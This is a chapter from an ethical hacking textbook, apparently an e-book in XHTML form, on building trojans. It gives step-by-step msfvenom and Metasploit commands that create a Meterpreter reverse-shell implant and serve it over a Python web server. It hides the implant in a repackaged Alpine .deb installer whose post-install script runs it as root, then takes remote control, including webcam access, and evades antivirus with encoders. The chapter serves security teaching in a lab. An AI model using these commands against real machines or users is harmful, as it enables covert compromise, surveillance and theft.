<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xmlns:ns="http://www.w3.org/2001/10/synthesis" lang="en-us" xml:lang="en-us">
	<head>
		<title>Ethical Hacking: A Hands-on Introduction to Breaking In</title>
		<link href="../styles/9781718501881.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:3776231c-affd-4772-8376-b44c973236be" name="Adept.expected.resource"/>
	</head>
	<body>
		<h2 class="h2" id="ch10"><span epub:type="pagebreak" id="page_187"/><strong><span class="big">10</span><br/>BUILDING TROJANS</strong></h2>
		<p class="verse"><em>Things are not always what they seem; the first appearance deceives many; the intelligence of a few perceives what has been carefully hidden.</em></p>
		<p class="chap-au">–Phaedrus</p>
		<div class="imagec">
			<img alt="image" src="../images/common.jpg"/>
		</div>
		<p class="noindents">Consider the following scenario: an attacker, pretending to be the head of IT, sends an email to an employee. The email tells the victim to download the updated version of the Alpine email client. But, unbeknownst to the victim, the attacker has embedded an implant in the program. When the victim installs the client, the installer will install the implant, too.</p>
		<p class="indent">All ethical hackers should understand the mechanisms of implants like these. Implants concealed within legitimate files are called <em>trojans</em>. I’ll begin by discussing the Drovorub malware implant developed by Russian military intelligence (GRU) and re-create its general design using Metasploit. The implant, which was designed for Linux systems, provides a great case study on modern malware.</p>
		<p class="indent">In this chapter, you’ll learn how to hide an implant in another file and obfuscate it to avoid detection using tools like <code>msfvenom</code>. You’ll also get some <span epub:type="pagebreak" id="page_188"/>practice writing custom Metasploit modules by creating an encoder that can help your implant evade antivirus software.</p>
		<p class="indent">After exploring implants for Linux and Windows systems, I’ll also show you how to generate malicious implants for Android devices that can listen to a phone’s microphone, take pictures with the phone’s camera, find the phones location, read and send text messages, and download the phone’s call log. In this chapter’s exercise, you’ll build an implant that can steal a victim’s password by logging their keystrokes and take their picture by accessing their camera.</p>
		<h3 class="h3" id="ch10lev1"><strong>Case Study: Re-Creating Drovorub by Using Metasploit</strong></h3>
		<p class="noindent">In 2020, the NSA released a report analyzing Drovorub. This section discusses the architecture of this implant, shown in <a href="ch10.xhtml#ch10fig1">Figure 10-1</a>, and describes how you can build something similar using open source tools like Meterpreter.</p>
		<div class="image" id="ch10fig1">
			<img alt="image" src="../images/ch10fig01.jpg"/>
		</div>
		<p class="figcap"><em>Figure 10-1: The architecture of the Drovorub implant described by the NSA report</em></p>
		<p class="indent">Drovorub consists of four key parts: the attacker’s server, the attacker’s agent, the malware client, and the malware kernel module. Once an attacker has compromised a victim’s machine, they install the malware client and malware kernel module. The kernel module helps the implant avoid detection by overriding the operating system’s malware detection functions. In a way, this is like pasting a picture of a room over a security camera. The malware client communicates with the attacker’s server, which manages connections from multiple machines and stores information on each connection in a central database, and allows the attacker to control the victim’s machine.</p>
		<p class="indent">You could construct something similar to the Drovorub implant using open source tools. We’ll do so here using the <em>Metasploit Framework</em>, an open source collection of software libraries, hacker tools, and exploit code. The ethical hacking community regularly contributes to Metasploit, so it’s a great tool to have in your ethical hacking toolbox.</p>
		<h4 class="h4" id="ch10lev2"><strong><em>Building the Attacker’s Server</em></strong></h4>
		<p class="noindent">Let’s begin by setting up the attacker’s server, also called the command and control server, which will accept connections from implants installed on victim devices. The Metasploit Framework allows you to host such a server on <span epub:type="pagebreak" id="page_189"/>an independent machine, but we’ll host it directly on our Kali Linux virtual machine. Run the following command to get the machine’s IP address:</p>
		<pre>kali@kali:~$ <span class="codestrong1">ifconfig eth0</span></pre>
		<p class="indent">Write down this address; you’ll need it later.</p>
		<p class="indent">Next, you’ll need to start the PostgreSQL server, which comes preinstalled on Kali Linux. PostgreSQL is the database that will store implant connection metadata.</p>
		<pre>kali@kali:~$ <span class="codestrong1">sudo service postgresql start</span></pre>
		<p class="indent">Now that the server is running, let’s start <code>msfconsole</code>, which allows you to access the features of the Metasploit Framework. Metasploit should be pre-installed in Kali Linux, so you shouldn’t have to install it yourself. Start <code>msfconsole</code> by opening a terminal and running the following command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">sudo msfconsole -q</span></pre>
		<p class="indent">The console will take some time to boot up. After it has started, run the following command to begin the server setup process:</p>
		<pre>msf&gt; <span class="codestrong1">use exploit/multi/handler</span></pre>
		<p class="indent">The <code>use</code> command allows you to select modules in the Metasploit Framework. <em>Modules</em> are pieces of software that perform specific tasks. We’ll use the handler modules in the <em>exploit/multi</em> folder to create the hacker’s server. These modules function like the TCP server we developed in <a href="ch04.xhtml#ch4">Chapter 4</a>. They will listen for connections from clients.</p>
		<p class="indent">Once you’ve selected the modules, use the <code>set</code> command to assign them context-specific values. Start by setting the type of implant for which the server should listen. Metasploit has several implant types for Windows, Linux, iOS, and Android systems. We’ll be attacking a Linux system, so we’ll listen for Linux x86 implants. Run the following command to set the type:</p>
		<pre>msf exploit (multi/hander) &gt;<span class="codestrong1">set PAYLOAD linux/x86/meterpreter/reverse_tcp</span></pre>
		<p class="indent">The <code>PAYLOAD</code> flag specifies the type of implant to listen for. Fun fact: the term <em>payload</em> has its origins in military terminology, where it is often used when referring to the contents of a bomb.</p>
		<p class="indent">Next, set the server’s IP address by passing it your Kali Linux machine’s IP address:</p>
		<pre>msf exploit (multi/hander) &gt; <span class="codestrong1">set LHOST &lt;Kali IP address&gt;</span></pre>
		<p class="indent"><code>LHOST</code> stands for <em>listening host</em>. Now set the listening port (<code>LPORT</code>):</p>
		<pre>msf exploit (multi/hander) &gt; <span class="codestrong1">set LPORT 443</span></pre>
		<p class="indent">We chose port 443 because it is associated with the HTTPS protocol and makes the network traffic appear less suspicious. Some implants even <span epub:type="pagebreak" id="page_190"/>communicate over the DNS protocol to avoid raising suspicion. Run the following command to start the server you’ve configured:</p>
		<pre>msf exploit (multi/hander) &gt; <span class="codestrong1">exploit</span></pre>
		<p class="indent">The <code>exploit</code> command runs the module. If you’ve successfully started the server, you should see the following output:</p>
		<pre>[*] Started reverse TCP handler on <span class="codeitalic">&lt;Kali IP address&gt;</span>:<span class="codestrong1">443</span></pre>
		<p class="indent">Leave this terminal open so that the server will continue to run.</p>
		<h4 class="h4" id="ch10lev3"><strong><em>Building the Victim Client</em></strong></h4>
		<p class="noindent">Now let’s create the implant that we’ll install on the victim’s machine. Create a new folder on your Kali Linux desktop called <em>Malware</em>:</p>
		<pre>kali@kali:~$ <span class="codestrong1">mkdir ~/Desktop/Malware</span></pre>
		<p class="indent">Open a new terminal and run the following command to navigate to that folder:</p>
		<pre>kali@kali:~$ <span class="codestrong1">cd ~/Desktop/Malware</span></pre>
		<p class="indent">We’ll use the <code>msfvenom</code> tool to create the malicious implant. Run the following command to do so:</p>
		<pre>kali@kali:~/Desktop/Malware$ <span class="codestrong1">sudo msfvenom -a x86 --platform linux -p linux/</span><br/>
     
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">x86/meterpreter/reverse_tcp LHOST=<span class="codeitalic">&lt;Kali IP address&gt;</span> LPORT=443 --</span><br/>
     
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">smallest -i 4 -f elf -o malicious</span></pre>
		<p class="indent">The <code>-a</code> flag represents the architecture being targeted, in this case <code>x86</code>. The <code>--platform</code> flag specifies the target platform, and the <code>-p</code> flag specifies the payload type, in this case a reverse TCP shell like the one we implemented in <a href="ch04.xhtml#ch4">Chapter 4</a>. The <code>--smallest</code> flag generates the smallest possible payload. The <code>-i</code> flag helps us to avoid antivirus detection, and I’ll discuss it more later. The <code>-f</code> flag presents the file type we need to output. We chose <code>elf</code> because it’s used by Linux executables. (The <em>exe</em> format is used by Windows executables.) The <code>-o</code> flag specifies the name of the output file.</p>
		<h4 class="h4" id="ch10lev4"><strong><em>Uploading the Implant</em></strong></h4>
		<p class="noindent">We’ll deliver the implant the same way we delivered the reverse shell in <a href="ch04.xhtml#ch4">Chapter 4</a>: by downloading it onto the victim machine. Start a Python server inside the Malware folder by running the following command.</p>
		<pre>kali@kali:~/Desktop/Malware/$ <span class="codestrong1">sudo python3 -m http.server 80</span></pre>
		<p class="indent">In previous chapters, we looked at several ways to gain access to a system. For simplicity, instead of using the backdoor like we did before, we’ll assume that a hacker has stolen the credentials for the system. Start up the <span epub:type="pagebreak" id="page_191"/>Metasploitable server and log in using username <strong>msfadmin</strong> and password <strong>msfadmin</strong>. Then, use the utility <code>wget</code> to download the implant:</p>
		<pre>msfadmin@metasploitable:~$ <span class="codestrong1">wget <span class="codeitalic">&lt;Kali IP address&gt;</span>:80/malicious</span></pre>
		<p class="indent">Make the implant executable (<code>+x</code>) by running the following command:</p>
		<pre>msfadmin@metasploitable:~$ <span class="codestrong1">sudo chmod +x malicious</span></pre>
		<p class="indent">Run the malicious program by executing the following command:</p>
		<pre>msfadmin@metasploitable:~$ <span class="codestrong1">sudo./malicious &amp;</span></pre>
		<p class="indent">The <code>&amp;</code> option runs the process in the background.</p>
		<p class="indent">Open the Kali terminal running the hacker’s server. If the implant has successfully connected, you should see output like the following:</p>
		<pre>msf5 exploit(multi/handler) &gt; <span class="codestrong1">exploit</span><br/><br/>
[*] Started reverse TCP handler on 192.168.1.107:443<br/>
[*] Sending stage (980808 bytes) to 192.168.1.101<br/>
[*] Meterpreter session 1 opened (192.168.1.107:443 -&gt; 192.168.1.101:36592)<br/>at 2022-11-10 15:02:15 -0500<br/><br/>meterpreter &gt;</pre>
		<p class="indent">Congratulations. You’ve just installed your first open source malware implant. Yes, it really is that easy. Now let’s interact with the implant using the attacker agent.</p>
		<h4 class="h4" id="ch10lev5"><strong><em>Using the Attacker Agent</em></strong></h4>
		<p class="noindent">This agent supports a variety of commands that allow you to interact with the implant. For example, you could list all the files on the machine using the <code>ls</code> command. Here, the Meterpreter interface represents the hacker agent:</p>
		<pre>meterpreter &gt; <span class="codestrong1">ls</span><br/>Listing: /home/msfadmin<br/>
=======================<br/><br/>Mode              Size  Type  Last modified              Name<br/>
----              ----  ----  -------------              ----<br/>
20666/rw-rw-rw-   0     cha   2021-11-06 09:39:55 -0500  .bash_history<br/>
40755/rwxr-xr-x   4096  dir   2010-04-28 16:22:12 -0400  .distcc<br/>
40700/rwx------   4096  dir   2021-11-08 06:25:02 -0500  .gconf<br/>
                        ...</pre>
		<p class="indent">You can download or edit any of these files using the <code>download</code> and <code>edit</code> commands, and you can list all available commands by running the <code>help</code> command.</p>
		<pre><span epub:type="pagebreak" id="page_192"/>meterpreter &gt; <span class="codestrong1">help</span><br/><br/>Core Commands<br/>
=============<br/>
    Command                   Description<br/>
    -------                   -----------<br/>
    ?                         Help menu<br/>
    background                Backgrounds the current session<br/>
    bg                        Alias for background<br/>
    bgkill                    Kills a background meterpreter script<br/>
                        ...</pre>
		<p class="indent">You can gain access to the victim’s shell by running the <code>shell</code> command:</p>
		<pre>meterpreter &gt;<span class="codestrong1">shell</span><br/>Process 13359 created.<br/>Channel 1 created.</pre>
		<p class="indent">Try interacting with the shell by running the command <code>whoami</code>. When you’re done, type <code><strong>exit</strong></code> to return to the Meterpreter interface.</p>
		<h4 class="h4" id="ch10lev6"><strong><em>Why We Need a Victim Kernel Module</em></strong></h4>
		<p class="noindent">If a system administrator on our Metasploitable machine views the running processes with the following command, the malicious program will show the following:</p>
		<pre>msfadmin@metasploitable:~$ <span class="codestrong1">ps au</span><br/><br/><br/>USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br/>
-------------------------------- snip -----------------------------------------<br/>root      3771  0.0  0.0   1716   488 tty6     Ss+  Nov06   0:00 /sbin/getty 38400 tty6<br/>root      4512  0.0  0.1   2852  1544 pts/0    Ss+  Nov06   0:00 -bash<br/>root      4617  0.0  0.1   2568  1204 tty1     Ss   Nov06   0:00 /bin/login --<br/>msfadmin 13073  0.0  0.1   4632  2040 tty1     S+   Nov08   0:00 -bash<br/>msfadmin 13326  0.0  0.0   1128  1028 tty1     S    02:08   0:00./malicious <span class="ent">➊</span> <br/>msfadmin 13414  0.0  0.1   4580  1924 pts/1    Ss   02:58   0:00 -bash<br/>msfadmin 13434  0.0  0.0   2644  1008 pts/1    R+   03:01   0:00 ps a</pre>
		<p class="indent">The <code>ps</code> command lists all (<code>a</code>) processes for all users (<code>u</code>). This command is equivalent to the task manager on Windows.</p>
		<p class="indent">As you can see, the malicious program shows up <span class="ent">➊</span>. How do hackers avoid detection? They do so using a <em>rootkit</em>, software that provides the implant access to functionality of the operating system’s kernel, which is the highest possible access. The implant can use this access to make itself virtually undetectable. For instance, Meterpreter will attempt to evade detection by pretending to be another process. On Windows, you can use <span epub:type="pagebreak" id="page_193"/>Meterpreter’s <code>migrate</code> command to hide your malicious process inside another process. We discuss the process of hiding in detail in <a href="ch11.xhtml#ch11">Chapter 11</a>.</p>
		<h3 class="h3" id="ch10lev7"><strong>Hiding an Implant in a Legitimate File</strong></h3>
		<p class="noindent">Attackers often use social engineering techniques to get implants onto a victim’s machine. For example, they might send a victim a phishing email that encourages them to download a <em>trojan</em>, a program that carefully hides a malicious implant inside another program. The term <em>trojan</em> comes from the Trojan wars, during which (legend has it) the Greeks gained access to the city of Troy by hiding in a large statue of a horse called the Trojan Horse. We’ll execute a similar attack here by sending a phishing email encouraging a victim to download an updated version of the company’s email client, Alpine, from a fake site. You’ll execute this attack on the Ubuntu desktop machine in your virtual environment. Let’s begin by creating the Trojan.</p>
		<h4 class="h4" id="ch10lev8"><strong><em>Creating a Trojan</em></strong></h4>
		<p class="noindent">Create a folder called <em>trojans</em> inside of your <em>Malicious</em> folder and navigate to it. This is where you’ll place the trojan you’ll create.</p>
		<pre>kali@kali:~$ <span class="codestrong1">mkdir ~/Desktop/Malware/trojans/</span><br/>kali@kali:~$ <span class="codestrong1">cd ~/Desktop/Malware/trojans/</span></pre>
		<p class="indent">We’ll create our trojan by modifying the Alpine installer, the <em>.deb</em> file, so that it installs the implant as well as Alpine. Download the legitimate Alpine installer by running the following command:</p>
		<pre>kali@kali:~/Desktop/Malware/trojans/$ <span class="codestrong1">apt-get download alpine</span></pre>
		<p class="indent">After you’ve downloaded the client, extract the contents of the file to the <em>mailTrojan</em> folder by running the following command:</p>
		<pre>kali@kali:~/Desktop/Malware/trojans/$ <span class="codestrong1">engrampa <span class="codeitalic">&lt;Alpine DEB file&gt;</span> -e mailTrojan</span></pre>
		<p class="indent">Open the <em>mailTrojan</em> folder. <a href="ch10.xhtml#ch10fig2">Figure 10-2</a> shows its contents.</p>
		<div class="image" id="ch10fig2">
			<img alt="image" src="../images/ch10fig02.jpg"/>
		</div>
		<p class="figcap"><em>Figure 10-2: The files in the</em> trojans/mailTrojan <em>folder contain the extracted.deb file.</em></p>
		<h5 class="h5" id="ch10lev9"><span epub:type="pagebreak" id="page_194"/><strong>Editing Your.deb File</strong></h5>
		<p class="noindent">You’ll need to edit the Alpine installer’s <em>.deb</em> installation file so that it includes your malicious implant, so let’s walk through the installer’s structure. All installation files must contain a <em>DEBIAN</em> folder, which contains the files that describe the program and how to install it. The installation file can also contain other folders such as <em>var</em> for files or <em>usr</em> for binaries. These folders are copied to a location relative to the <em>/home</em> directory during installation. For example, the installer would copy the <em>usr</em> folder to <em>/home/usr</em>. The installer then will read the contents of the <em>DEBIAN</em> folder.</p>
		<p class="indent">Click the <em>DEBIAN</em> folder. You should see the files shown in <a href="ch10.xhtml#ch10fig3">Figure 10-3</a>.</p>
		<div class="image" id="ch10fig3">
			<img alt="image" src="../images/ch10fig03.jpg"/>
		</div>
		<p class="figcap"><em>Figure 10-3: The contents of the</em> DEBIAN <em>folder</em></p>
		<p class="indent">As you can see, this folder contains three files (<em>control</em>, <em>md5sums</em>, and <em>postint</em>). Let’s look at each of these and alter them as required. The following is a snippet from the Alpine control file:</p>
		<pre><span class="ent">➊</span> Package: alpine<br/>
   Version: 2.24+dfsg1-1<br/><span class="ent">➋</span> Architecture: amd64<br/><span class="ent">➌</span> Maintainer: Asheesh Laroia &lt;asheesh@asheesh.org&gt;<br/>
   Installed-Size: 8774<br/><span class="ent">➍</span> Depends: mlock, libc6 (&gt;= 2.15), libcrypt1 (&gt;= 1:4.1.0), libgssapi-krb5-2 (&gt;=<br/>
       
			<img alt="image" src="../images/arrow01.jpg"/>
			 1.17), libkrb5-3 (&gt;= 1.6.dfsg.2), libldap-2.4-2 (&gt;= 2.4.7), libssl1.1 (&gt;=<br/>
       
			<img alt="image" src="../images/arrow01.jpg"/>
			 1.1.1), libtinfo6 (&gt;= 6)<br/>
   Recommends: alpine-doc, sensible-utils<br/>
   Suggests: aspell, default-mta | mail-transport-agent<br/>
   Conflicts: pine<br/>
   Replaces: pine<br/>
   Section: mail<br/>
   Priority: optional<br/>
   Homepage: http://alpine.x10host.com/alpine/<br/>
   Description: Text-based email client, friendly for novices but powerful<br/>
   Alpine is an upgrade of the well-known PINE email client.  Its name derives<br/>
   ...</pre>
		<p class="indent"><span epub:type="pagebreak" id="page_195"/>The control file is required for all Debian packages and must contain information on the program. For example, this file contains the name of the package <span class="ent">➊</span>, the hardware architecture that it supports <span class="ent">➋</span>, the name of the maintainer <span class="ent">➌</span>, and its dependencies <span class="ent">➍</span>.</p>
		<p class="indent">The <em>md5sums</em> file contains the MD5 hashes of the files included in the installation. These hashes aren’t checked during installation. Instead, they’re used to verify the integrity of the files after installation. If you want, you can add an MD5 hash of your malicious implant. You don’t have to, but it’s an extra stealthy step. The following is a snippet from the <em>md5sum</em> file:</p>
		<pre>55828c20af66f93128c3aefbb6e2f3ae  usr/bin/alpine<br/>b7cf485306ea34f20fa9bc6569c1f749  usr/bin/rpdump<br/>
1ab54d077bc2af9fefb259e9bad978ed  usr/bin/rpload</pre>
		<p class="indent">The <em>postint</em> file is run after the installation has completed. Debian packages normally contain <em>preint</em> and <em>postint</em> files that the original package developer placed to instruct the Debian package manager what to do before and after installation. We’ll add the code that will activate our implant to the <em>postint</em> file. The <em>postint</em> file is a great candidate because it will be run after the application has been installed, thus the implantation process won’t interfere with the installation. If the file doesn’t exist, create it by using the file manager or by running the following command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">touch ~/Desktop/Malware/trojans/mailTrojan/postint</span></pre>
		<p class="indent">Open the <em>postint</em> file and copy in the following code snippet.</p>
		<pre>  #!/bin/sh<br/>
  # postint script for Alpine mail Trojan<br/><br/><span class="ent">➊</span> sudo chmod 2755 /usr/bin/malicious &amp;<br/><span class="ent">➋</span> sudo./usr/bin/malicious &amp;<br/><br/>
  exit 0</pre>
		<p class="indent">This will add execute permissions to the malicious file <span class="ent">➊</span> and then executes it with root privileges <span class="ent">➋</span>.</p>
		<p class="indent">Next, make <em>postint</em> executable by running the following command:</p>
		<pre>kali@kali:~$ <span class="codestrong1">chmod +x ~/Desktop/Malware/trojans/mailTrojan/postint</span></pre>
		<h5 class="h5" id="ch10lev10"><strong>Adding the Implant</strong></h5>
		<p class="noindent">Now we’ll create the implant and add it to the <em>/usr/bin</em> folder, to ensure that the installer will copy it to the <em>/home/usr/bin</em> folder on the victim’s machine during installation. Start by navigating to <em>usr/bin</em> inside the <em>mailTrojan</em> folder:</p>
		<pre>kali@kali:~/Desktop/Malware/trojans/mailTrojan$ <span class="codestrong1">cd usr/bin</span></pre>
		<p class="indent"><span epub:type="pagebreak" id="page_196"/>Next, use the <code>msfvenom</code> command to create the malicious file, as follows:</p>
		<pre>kali@kali:~/Desktop/Malware/trojans/mailTrojan/usr/bin$ <span class="codestrong1">msfvenom -a x86 --</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">platform linux -p linux/x86/meterpreter/reverse_tcp LHOST=<span class="codeitalic">&lt;Kali IP</span></span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1"><span class="codeitalic">address&gt;</span> LPORT=8443 -b "\x00" -f elf -o malicious</span></pre>
		<p class="indent">We’ll use <code>msfvenom</code> with the same options as before to generate a malicious implant. However, instead of copying the implant directly onto the victim’s machine, we’ll hide it inside Alpine’s installation folder. Copy the resulting <em>malicous</em> binary to the <em>usr</em> folder. Now the contents of your <em>usr/bin/</em> folder should resemble <a href="ch10.xhtml#ch10fig4">Figure 10-4</a>.</p>
		<div class="image" id="ch10fig4">
			<img alt="image" src="../images/ch10fig04.jpg"/>
		</div>
		<p class="figcap"><em>Figure 10-4: The contents of the</em> usr/bin/ <em>folder</em></p>
		<p class="indent">Now you’re ready to repackage your files into your final <em>.deb</em> installation file. Run the following command to start the repacking process:</p>
		<pre>kali@kali:~/Desktop/Malware/trojans/mailTrojan$ <span class="codestrong1">dpkg-deb --build ~/Desktop/</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">Malware/trojans/mailTrojan</span></pre>
		<p class="indent">Voilà! You’ve created your first trojan. You can view it by navigating to the <em>/Desktop/Malware/trojans</em> folder and running the <code><strong>ls</strong></code> command:</p>
		<pre>kali@kali:~/Desktop/Malware/trojans$ <span class="codestrong1">ls</span><br/>alpine_2.24+dfsg1-1_amd64.deb mailTrojan mailTrojan.deb</pre>
		<p class="indent">The file beginning with <em>alpine</em> is the unmodified Alpine installer. The <em>mailTrojan</em> folder is the folder to which we’ve just added the malicious files, and <em>mailTrojan.deb</em> is our newly repackaged trojan containing the implant. One suggested improvement: an attacker might pick a stealthier name.</p>
		<p class="indent">Attacks like this really do work, often at a large scale. Take Solarwinds, which makes software that governments and large corporations use to manage and secure their networks. In 2020, hackers were able to break into Solarwinds computers and modified one of their software libraries to include a malicious implant. When Solarwinds installed their software update, it also installed the infected library. This attack affected several corporations and government agencies that used Solarwinds software. The implant was carefully crafted, even containing a strategy for avoiding detection. For example, it waited two weeks before activating and wouldn’t start if it detected security-related software like Wireshark.</p>
		<h4 class="h4" id="ch10lev11"><span epub:type="pagebreak" id="page_197"/><strong><em>Hosting the Trojan</em></strong></h4>
		<p class="noindent">An attacker could host the trojan we’ve just created on GitHub or on a faked website. In this section, we’ll host the trojan on our Kali Linux virtual machine and serve it from a local webserver. Ensure that you’re in the folder containing your trojan and run the following command:</p>
		<pre>kali@kali:~/Desktop/Malware/trojans$ <span class="codestrong1">sudo python3 -m http.server 80</span></pre>
		<p class="indent">Next, you’ll need to start the attacker server that will listen for connections from your implant. Instead of performing one step at a time as we did earlier, we can run all of the commands on one line in a new terminal:</p>
		<pre>kali@kali:~$ <span class="codestrong1">msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">x86/meterpreter/reverse_tcp; set LHOST <span class="codeitalic">&lt;Kali IP address&gt;</span></span>; <span class="codestrong1">set LPORT</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">8443; run; exit -y"</span></pre>
		<p class="indent">Now we have two servers running: one that serves the implant and another that accepts incoming connections from all installed implants. The next thing we must do is test the trojan by downloading the implant onto our Ubuntu virtual machine.</p>
		<h4 class="h4" id="ch10lev12"><strong><em>Downloading the Infected File</em></strong></h4>
		<p class="noindent">Start the Ubuntu virtual machine and then simulate a user clicking an email link by copying and pasting the following link into the browser, making sure to specify the IP address of your Kali Linux machine: <em>http://&lt;Kali IP address&gt;/mailTrojan.deb</em>.</p>
		<p class="indent">Select the <strong>Save File</strong> option when presented with a download window, as shown in <a href="ch10.xhtml#ch10fig5">Figure 10-5</a>.</p>
		<div class="image" id="ch10fig5">
			<img alt="image" src="../images/ch10fig05.jpg"/>
		</div>
		<p class="figcap"><em>Figure 10-5: Downloading the</em> mailTrojan.deb <em>file</em></p>
		<p class="indent"><span epub:type="pagebreak" id="page_198"/>This will save the <em>.deb</em> installer file to your <em>Downloads</em> folder. Open the <em>Downloads</em> folder in the file explorer and then install the file by right-clicking and selecting <strong>Open with</strong> ▶ <strong>Install Software</strong>.</p>
		<p class="indent">You might be wondering if an actual user would really do all of this. But consider all the packages you’ve installed by running <code>sudo apt-get</code>. Can you be sure that none of those <em>.deb</em> files contained implants? Once you’ve started the package installer, you should see the screen in <a href="ch10.xhtml#ch10fig6">Figure 10-6</a>. Select <strong>Install</strong>.</p>
		<div class="image" id="ch10fig6">
			<img alt="image" src="../images/ch10fig06.jpg"/>
		</div>
		<p class="figcap"><em>Figure 10-6: The install screen for the Alpine email client</em></p>
		<p class="indent">Enter your Ubuntu password. Once the installation process has completed, run the following command to start the Alpine terminal email client:</p>
		<pre>victim@ubuntu:~/Download/$ <span class="codestrong1">alpine</span></pre>
		<p class="indent">If Alpine was installed correctly, you will see a terminal interface. Now let’s check whether our implant was installed, too.</p>
		<h4 class="h4" id="ch10lev13"><strong><em>Controlling the Implant</em></strong></h4>
		<p class="noindent">Reopen the terminal running the attacker server you started earlier. If the implant was correctly installed, you should see the following, indicating the implant has connected to the server:</p>
		<pre>[*] Meterpreter session 1 opened (192.168.1.107:8443 -&gt; 192.168.1.109:43476)<br/>meterpreter &gt;</pre>
		<p class="indent"><span epub:type="pagebreak" id="page_199"/>Great! Run the following command to see all the things you can do with your implant:</p>
		<pre>meterpreter&gt; <span class="codestrong1">help</span><br/>
          ...<br/>Stdapi: System Commands<br/>
=======================<br/><br/>
    Command       Description<br/>
    -------       -----------<br/>
    execute       Execute a command<br/>
    getenv        Get one or more environment variable values<br/>
    getpid        Get the current process identifier<br/>
    getuid        Get the user that the server is running as<br/>
    kill          Terminate a process<br/>
    localtime     Displays the target system local date and time<br/>
    pgrep         Filter processes by name<br/>
    pkill         Terminate processes by name<br/>
    ps            List running processes<br/>
    shell         Drop into a system command shell<br/>
    suspend       Suspends or resumes a list of processes<br/>
    sysinfo       Gets information about the remote system, such as OS<br/><br/><br/>Stdapi: Webcam Commands<br/>
=======================<br/><br/>
    Command        Description<br/>
    -------        -----------<br/>
    webcam_chat    Start a video chat<br/>
    webcam_list    List webcams<br/>
    webcam_snap    Take a snapshot from the specified webcam<br/>
    webcam_stream  Play a video stream from the specified webcam<br/>
                      ...</pre>
		<p class="indent">Now what could you do to go further? How about installing a backdoor so that you can easily get back in? The Meterpreter implant will disconnect if someone restarts the machine or deletes the malicious file. You could attempt to maintain access by recompromising the machine, but if the victim changes their password or patches the program you originally exploited, all your effort would have been for nothing. This is why hackers install backdoors; they allow an attacker to regain access to a machine through an alternate route. When I discuss rookits in <a href="ch11.xhtml#ch11">Chapter 11</a>, I’ll show you how to design your own backdoor. But if you want to install one now, consider using the <em>dbd backdoor</em> designed by Kyle Barnthouse and available at <em><a href="https://github.com/gitdurandal/dbd/">https://github.com/gitdurandal/dbd/</a></em>.</p>
		<h3 class="h3" id="ch10lev14"><span epub:type="pagebreak" id="page_200"/><strong>Evading Antivirus by Using Encoders</strong></h3>
		<p class="noindent">Won’t antivirus software detect these malicious programs? Not always. You can see which antivirus software will detect your implant by uploading it to Virus Total at <em><a href="https://www.virustotal.com/gui/">https://www.virustotal.com/gui/</a></em>.</p>
		<p class="indent">Antivirus systems use <em>signature detection</em> to attempt to find malware. A malware’s signature is a unique sequence of bytes that represents it. You can see our malicious implant’s byte sequence by running the <code>xxd</code> command:</p>
		<pre>kali@kali:~/Desktop/Malware$ <span class="codestrong1">xxd malicious</span><br/>
00000000: 7f45 4c46 0101 0100 0000 0000 0000 0000  .ELF............<br/>
00000010: 0200 0300 0100 0000 5480 0408 3400 0000  ........T...4...<br/>
00000020: 0000 0000 0000 0000 3400 2000 0100 0000  ........4. .....<br/>
00000030: 0000 0000 0100 0000 0000 0000 0080 0408  ................<br/>
00000040: 0080 0408 2e01 0000 0802 0000 0700 0000  ................<br/>
00000050: 0010 0000 6a31 59d9 eed9 7424 f45b 8173  ....j1Y...t$.[.s<br/>
00000060: 1388 81fd 1583 ebfc e2f4 e2aa a4cc 6658  ..............fX<br/>
00000070: 8931 7cda 7c66 9be3 0504 2702 16e9 6a75  .1|.|f....'...ju<br/>
00000080: f5c8 c0f7 7134 ed0a 6bb6 185d 8ca5 699c  ....q4..k..]..i.<br/>
00000090: eb6e 72d2 7d19 bbc1 7440 3f07 59bd 2585  .nr.}...t@?.Y.%.<br/>
000000a0: acea c2fe 17fb e35d c665 332a 67a9 eddd  .......].e3*g...<br/>
000000b0: d654 50bf 4ef0 d9ee bdc5 3a0d c023 24b7  .TP.N.....:..#$.<br/>
000000c0: 6563 1bed 66cb b1ec 0c18 3a0d 67c5 ebbc  ec..f.....:.g...<br/>
000000d0: 5cf4 3a0d 4e6e 3369 cdda aaa2 799e db4e  \.:.Nn3i....y..N<br/>
000000e0: 0da3 b3b4 67a3 d9e9 8440 8225 c023 362c  ....g....@.%.#6,<br/>
000000f0: 741e 58cb bfa4 0aec 1da3 b365 ee62 58e0  t.X........e.bX.<br/>
00000100: cc40 bf5c 706e 3369 cddb a3b7 8442 2a5e  .@.\pn3i.....B*^<br/>
00000110: 6713 b021 8d26 7394 0f5c 5254 0ca3 b3ec  g..!.&amp;s..\RT....<br/>
00000120: b6a2 b3ec 0d6e 33ec 2d99 992e fd15       .....n3.-.....</pre>
		<p class="indent">Antivirus software detects malware by scanning memory for these signatures, so you can avoid detection by ensuring that your malware has a signature not already known to antivirus systems.</p>
		<p class="indent">One way to do this is by running the malware through an <em>encoder</em>. Encoders change a program’s signature by modifying its bytes without changing its functionality. You might be wondering: Wouldn’t changing the bytes change both the instructions and the program’s functionality? Well, two programs can have the same functionality even if they don’t use the same instructions. For example, both of these programs multiply a number by 2:</p>
		<pre>a = a + a<br/>a = a * 2</pre>
		<p class="indent">Let’s make this idea concrete by applying a simple encoder. Msfvenom supports several encoders. You can view a list of them by starting <code>msfconsole</code> and running the <code>show encoders</code> command.</p>
		<pre>kali@kali:~$ <span class="codestrong1">msfconsole -q</span><br/>msf5 &gt; <span class="codestrong1">show encoders</span><br/><br/><span epub:type="pagebreak" id="page_201"/>Encoders<br/>
========<br/><br/>
   #   Name                  Rank    Check  Description<br/>
   -   ----                  ----    -----  -----------<br/>
                            ...<br/>
